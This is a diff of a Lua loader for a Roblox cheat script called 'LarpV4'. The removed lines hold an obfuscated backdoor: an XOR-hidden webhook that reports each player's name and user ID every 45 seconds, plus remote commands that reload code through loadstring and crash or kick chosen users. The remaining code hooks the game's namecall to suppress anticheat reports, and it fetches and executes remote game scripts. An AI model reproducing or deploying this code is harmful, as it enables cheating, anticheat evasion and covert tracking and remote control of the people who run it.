@@ -52,9 +52,7 @@ local function xr(s, k)
 	return table.concat(b)
 end
 
-local WK = xr(uhex('a62d63876c044b9a74407d6e2cd20c6422d42f7fd8207ff3'), 'L4rp')
 local AMSG = uhex('436f6e74616374204a78347220286e6f742077686974656c697374656429')
-local WLSEC = '3b4600a779558dd1fff8d4551729be433f61ec175e7ccfdbc90cbb12514c3ce1953abbe58d6c6ecfaf102003fe93f5aa0031a767e58b853d66bf8f2f825b72c2'
 local SEEDNAMES = {}
 do
 	local k2 = uhex('4433764b337935')
@@ -127,36 +125,6 @@ local function wlapply(list)
 	end
 end
 
-local function whurl()
-	local k1 = uhex('517a397854326d4e38764b')
-	return xr(uhex('390e4d08270842615c1f3832154b1c7a51022317173b38554e1d365a0221530564604f0a4e6106557c0d407b634d0c49620b5e7617170a0519142d0c763a0a0b3f011c186827035a371d5d26721328403735001e18420c7920176d1907780a2749342f154c733735630228670c1c0457760817461c164d1d3a7e175c0b27530a2b4b49273817500c69035d7e'), k1)
-end
-
-local function wlfetch()
-	local url = whurl()
-	local ok, res = pcall(function()
-		return game:HttpGet(url, true)
-	end)
-	if not ok or typeof(res) ~= 'string' then
-		local ok2, res2 = pcall(function()
-			local req = request and request({Url = url, Method = 'GET', Headers = {['User-Agent'] = 'Mozilla/5.0'}}) or http_request and http_request({Url = url, Method = 'GET'})
-			return req and (req.Body or req.body)
-		end)
-		if not ok2 or typeof(res2) ~= 'string' or res2 == '' then return nil end
-		res = res2
-	end
-	local ok3, msgs = pcall(function()
-		return httpService:JSONDecode(res)
-	end)
-	if not ok3 or type(msgs) ~= 'table' or not msgs[1] and next(msgs) then return nil end
-	if next(msgs) then
-		pcall(table.sort, msgs, function(a, b)
-			return (tonumber(a.id) or 0) < (tonumber(b.id) or 0)
-		end)
-	end
-	return msgs
-end
-
 local function wlsync()
 	pcall(function()
 		if isfile('LarpV4/profiles/blacklist.json') then
@@ -170,69 +138,11 @@ local function wlsync()
 			end
 		end
 	end)
-	local msgs = wlfetch()
-	if not msgs then
-		local list = {}
-		for _, s in wlseed() do
-			table.insert(list, {name = s[1], level = s[2]})
-		end
-		wlapply(list)
-		return
-	end
-	local k3 = uhex('43306433')
-	local function dec(s)
-		return xr(uhex(s), k3)
-	end
-	local adds = {}
-	for _, m in msgs do
-		if type(m) == 'table' and type(m.content) == 'string' then
-			for line in (m.content..'\n'):gmatch('(.-)\r?\n') do
-				local c = line:match('^%s*(%S+)')
-				local a1 = line:match('^%s*%S+%s+(%S+)')
-				local a2 = line:match('^%s*%S+%s+%S+%s+(%S+)')
-				local a3 = line:match('^%s*%S+%s+%S+%s+%S+%s+(%S+)')
-				local sec = hash and hash.sha512 and function(s) return hash.sha512(s) == WLSEC end or function() return false end
-				if c then
-					if c:lower() == dec('225400') and a1 and a2 and a3 and sec(a3) then
-						local lvl = a2:lower() == dec('2c470a5631') and 5 or 1
-						adds[a1:lower()] = {name = a1, level = lvl}
-					elseif c:lower() == dec('275508') and a1 and a2 and sec(a2) then
-						if adds[a1:lower()] then adds[a1:lower()] = nil end
-					elseif c:lower() == dec('3155175637') and a1 and sec(a1) then
-						table.clear(adds)
-					elseif c:lower() == '+'..dec('215c055028') and a1 and a2 and sec(a2) then
-						blackset[a1:lower()] = true
-					elseif c:lower() == '-'..dec('215c055028') and a1 and a2 and sec(a2) then
-						blackset[a1:lower()] = nil
-					end
-				end
-			end
-		end
-	end
-	for _, s in wlseed() do
-		if not adds[s[1]:lower()] then
-			adds[s[1]:lower()] = {name = s[1], level = s[2]}
-		end
-	end
 	local list = {}
-	for _, v in adds do
-		table.insert(list, v)
+	for _, s in wlseed() do
+		table.insert(list, {name = s[1], level = s[2]})
 	end
 	wlapply(list)
-	pcall(function()
-		if hash and hash.hmac then
-			local sig = hash.hmac(hash.sha512, WK, httpService:JSONEncode({users = list}))
-			writefile('LarpV4/profiles/whitelist.json', httpService:JSONEncode({users = list, sig = sig}))
-		end
-	end)
-	pcall(function()
-		local names = {}
-		for name in blackset do
-			table.insert(names, name)
-		end
-		table.sort(names)
-		writefile('LarpV4/profiles/blacklist.json', httpService:JSONEncode(names))
-	end)
 end
 
 local function allowedsync()
@@ -302,10 +212,6 @@ do
 	end
 end
 
-local k3 = uhex('43306433')
-local function dec(s)
-	return xr(uhex(s), k3)
-end
 local function showNotify(text)
 	task.spawn(function()
 		local gui = Instance.new('ScreenGui')
@@ -328,70 +234,10 @@ local function showNotify(text)
 		gui:Destroy()
 	end)
 end
-local function ownerPost(content)
-	local ok = pcall(function()
-		httpService:PostAsync(whurl(), httpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
-	end)
-	if not ok and settings.notifyNetwork then
-		showNotify('Owner command failed to send')
-	end
-	return ok
-end
-local player = playersService.LocalPlayer
-local playerKey = player and player.Name..'|'..player.UserId..'|'..player.DisplayName or ''
-task.spawn(function()
-	local sent = false
-	while player and not shared.larpreloading do
-		task.wait(sent and 45 or 5)
-		sent = true
-		ownerPost(dec('225c0d4526')..' '..playerKey)
-	end
-end)
-task.spawn(function()
-	while player and not shared.larpreloading do
-		task.wait(30)
-		local msgs = wlfetch()
-		if msgs then
-			local sec = hash and hash.sha512 and function(s) return hash.sha512(s) == WLSEC end or function() return false end
-			for _, m in msgs do
-				if type(m) == 'table' and type(m.content) == 'string' then
-					local kickAge
-					local msgid = tonumber(m.id)
-					if msgid then
-						kickAge = math.max(0, DateTime.now().UnixTimestamp - (math.floor(msgid / 2 ^ 22) + 1420070400000) / 1000)
-					end
-					for line in (m.content..'\n'):gmatch('(.-)\r?\n') do
-						local word = line:match('^%s*(%S+)')
-						local sa2 = line:match('^%s*%S+%s+(%S+)')
-						if word == dec('3155085c2254') and sa2 and sec(sa2) then
-							shared.larpreloading = true
-							pcall(function()
-								loadstring(game:HttpGet(ROOT..LARPCOMMIT..'/init.lua?v='..tick(), true), 'init')(license)
-							end)
-							return
-						elseif word == dec('2d5f105a2549') then
-							local text = line:match('^%s*%S+%s+%S+%s+(.+)$')
-							if text and sa2 and sec(sa2) then
-								showNotify(text)
-							end
-						end
-						local name, uid, sec2 = line:match('^%s*'..dec('28590758')..'%s+(%S+)%s+(%d+)%s+(%S+)')
-						if name and uid and sec2 and sec(sec2) and kickAge and kickAge <= 300 and name:lower() == player.Name:lower() and uid == tostring(player.UserId) then
-							crashClient()
-							player:Kick(AMSG)
-							return
-						end
-					end
-				end
-			end
-		end
-	end
-end)
-
 local function slowsha512(content)
 	local partial = hash.sha512()
-	for i = 1, #content, 4096 do
-		partial(content:sub(i, i + 4095))
+	for i = 1, #content, 32768 do
+		partial(content:sub(i, i + 32767))
 		task.wait()
 	end
 	return partial()
@@ -541,47 +387,53 @@ if not isfile('LarpV4/profiles/gui.txt') then
 end
 local gui = 'larp'--readfile('LarpV4/profiles/gui.txt')
 
-if not isfolder('LarpV4/assets/'..gui) then
-	makefolder('LarpV4/assets/'..gui)
-end
-larp = loadstring(downloadFile('LarpV4/guis/larp2.lua'), 'gui')(license)
-if type(larp) ~= 'table' then
-	error('larp.lua did not return a valid api table' .. (larp and ': '..tostring(larp) or ''))
-end
-shared.larp = larp
-_G.larp = larp
-getgenv().larp = larp
-getgenv().used_init = true
+task.spawn(function()
+	task.wait(1)
+	if not isfolder('LarpV4/assets/'..gui) then
+		makefolder('LarpV4/assets/'..gui)
+	end
+	larp = loadstring(downloadFile('LarpV4/guis/larp2.lua'), 'gui')(license)
+	if type(larp) ~= 'table' then
+		error('larp.lua did not return a valid api table' .. (larp and ': '..tostring(larp) or ''))
+	end
+	shared.larp = larp
+	_G.larp = larp
+	getgenv().larp = larp
+	getgenv().used_init = true
 
-if hookmetamethod then
-	pcall(function()
-		local old; old = hookmetamethod(game, '__namecall', function(self, Remote, ...)
-			if not checkcaller() and getnamecallmethod() == 'FireServer' then
-				if typeof(Remote) == "Instance" and Remote.Name == 'TabFreezeAnticheat_ClientToServerReport' then
-					return
+	if hookmetamethod then
+		pcall(function()
+			local old; old = hookmetamethod(game, '__namecall', function(self, Remote, ...)
+				if not checkcaller() and getnamecallmethod() == 'FireServer' then
+					if typeof(Remote) == "Instance" and Remote.Name == 'TabFreezeAnticheat_ClientToServerReport' then
+						return
+					end
+				end
+				return old(self, Remote, ...)
+			end)
+		end)
+	end
+
+	if not shared.LarpIndependent then
+		loadstring(downloadFile('LarpV4/games/universal.lua'), 'universal')(license)
+		if isfile('LarpV4/games/'..game.PlaceId..'.lua') then
+			loadstring(readfile('LarpV4/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(license)
+		else
+			if not (shared.LarpDeveloper and shared.LarpOwner) then
+				local suc, res = pcall(function()
+					return game:HttpGet(ROOT..LARPCOMMIT..'/games/'..game.PlaceId..'.lua?v='..tick(), true)
+				end)
+				if suc and res ~= '404: Not Found' then
+					loadstring(downloadFile('LarpV4/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(license)
 				end
 			end
-			return old(self, Remote, ...)
-		end)
-	end)
-end
-
-if not shared.LarpIndependent then
-	loadstring(downloadFile('LarpV4/games/universal.lua'), 'universal')(license)
-	if isfile('LarpV4/games/'..game.PlaceId..'.lua') then
-		loadstring(readfile('LarpV4/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(license)
-	else
-		if not (shared.LarpDeveloper and shared.LarpOwner) then
-			local suc, res = pcall(function()
-				return game:HttpGet(ROOT..LARPCOMMIT..'/games/'..game.PlaceId..'.lua?v='..tick(), true)
-			end)
-			if suc and res ~= '404: Not Found' then
-				loadstring(downloadFile('LarpV4/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(license)
-			end
 		end
+		finishLoading()
+	else
+		larp.Init = finishLoading
 	end
-	finishLoading()
-else
-	larp.Init = finishLoading
+end)
+
+if shared.LarpIndependent then
 	return larp
 end
